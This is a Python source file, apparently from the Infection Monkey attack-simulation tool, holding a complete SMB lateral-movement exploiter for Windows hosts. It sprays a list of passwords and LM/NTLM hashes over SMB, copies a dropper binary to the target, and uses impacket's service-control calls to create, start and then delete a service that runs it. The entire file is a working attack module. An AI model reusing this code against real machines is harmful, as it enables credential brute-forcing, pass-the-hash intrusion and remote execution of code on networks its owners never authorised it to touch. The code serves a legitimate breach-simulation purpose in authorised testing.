from logging import getLogger

from impacket.dcerpc.v5 import scmr, transport

from common.utils.attack_utils import ScanStatus, UsageEnum
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import (
    build_monkey_commandline,
    get_monkey_depth,
    get_target_monkey,
)
from infection_monkey.exploit.tools.smb_tools import SmbTools
from infection_monkey.model import DROPPER_CMDLINE_DETACHED_WINDOWS, MONKEY_CMDLINE_DETACHED_WINDOWS
from infection_monkey.network.smbfinger import SMBFinger
from infection_monkey.network.tools import check_tcp_port
from infection_monkey.telemetry.attack.t1035_telem import T1035Telem

LOG = getLogger(__name__)


class SmbExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = "SMB"
    KNOWN_PROTOCOLS = {
        "139/SMB": (r"ncacn_np:%s[\pipe\svcctl]", 139),
        "445/SMB": (r"ncacn_np:%s[\pipe\svcctl]", 445),
    }
    USE_KERBEROS = False

    def __init__(self, host):
        super(SmbExploiter, self).__init__(host)
        self.vulnerable_port = None

    def is_os_supported(self):
        if super(SmbExploiter, self).is_os_supported():
            return True

        if not self.host.os.get("type"):
            is_smb_open, _ = check_tcp_port(self.host.ip_addr, 445)
            if is_smb_open:
                smb_finger = SMBFinger()
                smb_finger.get_host_fingerprint(self.host)
            else:
                is_nb_open, _ = check_tcp_port(self.host.ip_addr, 139)
                if is_nb_open:
                    self.host.os["type"] = "windows"
            return self.host.os.get("type") in self._TARGET_OS_TYPE
        return False

    def _exploit_host(self):
        src_path = get_target_monkey(self.host)

        if not src_path:
            LOG.info("Can't find suitable monkey executable for host %r", self.host)
            return False

        creds = self._config.get_exploit_user_password_or_hash_product()

        exploited = False
        for user, password, lm_hash, ntlm_hash in creds:
            try:
                # copy the file remotely using SMB
                remote_full_path = SmbTools.copy_file(
                    self.host,
                    src_path,
                    self._config.dropper_target_path_win_32,
                    user,
                    password,
                    lm_hash,
                    ntlm_hash,
                    self._config.smb_download_timeout,
                )

                if remote_full_path is not None:
                    LOG.debug(
                        "Successfully logged in %r using SMB (%s : (SHA-512) %s : (SHA-512) "
                        "%s : (SHA-512) %s)",
                        self.host,
                        user,
                        self._config.hash_sensitive_data(password),
                        self._config.hash_sensitive_data(lm_hash),
                        self._config.hash_sensitive_data(ntlm_hash),
                    )
                    self.report_login_attempt(True, user, password, lm_hash, ntlm_hash)
                    self.add_vuln_port(
                        "%s or %s"
                        % (
                            SmbExploiter.KNOWN_PROTOCOLS["139/SMB"][1],
                            SmbExploiter.KNOWN_PROTOCOLS["445/SMB"][1],
                        )
                    )
                    exploited = True
                    break
                else:
                    # failed exploiting with this user/pass
                    self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)

            except Exception as exc:
                LOG.debug(
                    "Exception when trying to copy file using SMB to %r with user:"
                    " %s, password (SHA-512): '%s', LM hash (SHA-512): %s, NTLM hash ("
                    "SHA-512): %s: (%s)",
                    self.host,
                    user,
                    self._config.hash_sensitive_data(password),
                    self._config.hash_sensitive_data(lm_hash),
                    self._config.hash_sensitive_data(ntlm_hash),
                    exc,
                )
                continue

        if not exploited:
            LOG.debug("Exploiter SmbExec is giving up...")
            return False

        self.set_vulnerable_port()
        # execute the remote dropper in case the path isn't final
        if remote_full_path.lower() != self._config.dropper_target_path_win_32.lower():
            cmdline = DROPPER_CMDLINE_DETACHED_WINDOWS % {
                "dropper_path": remote_full_path
            } + build_monkey_commandline(
                self.host,
                get_monkey_depth() - 1,
                self.vulnerable_port,
                self._config.dropper_target_path_win_32,
            )
        else:
            cmdline = MONKEY_CMDLINE_DETACHED_WINDOWS % {
                "monkey_path": remote_full_path
            } + build_monkey_commandline(
                self.host, get_monkey_depth() - 1, vulnerable_port=self.vulnerable_port
            )

        smb_conn = False
        for str_bind_format, port in SmbExploiter.KNOWN_PROTOCOLS.values():
            rpctransport = transport.DCERPCTransportFactory(str_bind_format % (self.host.ip_addr,))
            rpctransport.set_dport(port)
            rpctransport.setRemoteHost(self.host.ip_addr)
            if hasattr(rpctransport, "set_credentials"):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(user, password, "", lm_hash, ntlm_hash, None)
            rpctransport.set_kerberos(SmbExploiter.USE_KERBEROS)

            scmr_rpc = rpctransport.get_dce_rpc()

            try:
                scmr_rpc.connect()
            except Exception as exc:
                LOG.debug(
                    "Can't connect to SCM on exploited machine %r port %s : %s",
                    self.host,
                    port,
                    exc,
                )
                continue

            smb_conn = rpctransport.get_smb_connection()
            break

        if not smb_conn:
            return False
        # We don't wanna deal with timeouts from now on.
        smb_conn.setTimeout(100000)
        scmr_rpc.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(scmr_rpc)
        sc_handle = resp["lpScHandle"]

        # start the monkey using the SCM
        resp = scmr.hRCreateServiceW(
            scmr_rpc,
            sc_handle,
            self._config.smb_service_name,
            self._config.smb_service_name,
            lpBinaryPathName=cmdline,
        )
        service = resp["lpServiceHandle"]
        try:
            scmr.hRStartServiceW(scmr_rpc, service)
            status = ScanStatus.USED
        except Exception:
            status = ScanStatus.SCANNED
            pass
        T1035Telem(status, UsageEnum.SMB).send()
        scmr.hRDeleteService(scmr_rpc, service)
        scmr.hRCloseServiceHandle(scmr_rpc, service)

        LOG.info(
            "Executed monkey '%s' on remote victim %r (cmdline=%r)",
            remote_full_path,
            self.host,
            cmdline,
        )

        self.add_vuln_port(
            "%s or %s"
            % (
                SmbExploiter.KNOWN_PROTOCOLS["139/SMB"][1],
                SmbExploiter.KNOWN_PROTOCOLS["445/SMB"][1],
            )
        )
        return True

    def set_vulnerable_port(self):
        if "tcp-445" in self.host.services:
            self.vulnerable_port = "445"
        elif "tcp-139" in self.host.services:
            self.vulnerable_port = "139"
        else:
            self.vulnerable_port = None
